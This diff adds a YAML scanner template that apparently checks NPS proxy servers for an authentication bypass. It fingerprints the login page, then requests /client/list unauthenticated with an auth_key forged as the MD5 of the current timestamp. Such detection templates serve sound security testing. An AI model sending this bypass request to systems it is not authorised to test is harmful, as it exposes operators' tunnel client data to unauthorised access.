@@ -1,0 +1,28 @@
+name: yaml-poc-ehang_io-nps-logical-CT-469727
+binding: a9bcb4c0-fba7-46bb-8725-131358650fef
+detail:
+    author: system_user
+    vulnerability:
+        id: bff89d60-9030-4516-8e4c-f91fef0b6554
+        level: high
+transport: http
+set:
+    r1: int(now())
+    r2: md5(string(r1))
+rules:
+    finger:
+        request:
+            cache: true
+            method: GET
+            path: /login/index
+        expression: response.status == 200 && response.body.bcontains(bytes("https://ehang.io/nps")) && response.headers["Set-Cookie"].contains("beegosessionID=")
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /client/list
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: search=&order=asc&offset=0&limit=10&auth_key={{r2}}&timestamp={{r1}}
+        expression: response.status == 200 && response.body.bcontains(bytes("rows")) && response.body.bcontains(bytes("total"))
+expression: finger() && r0()
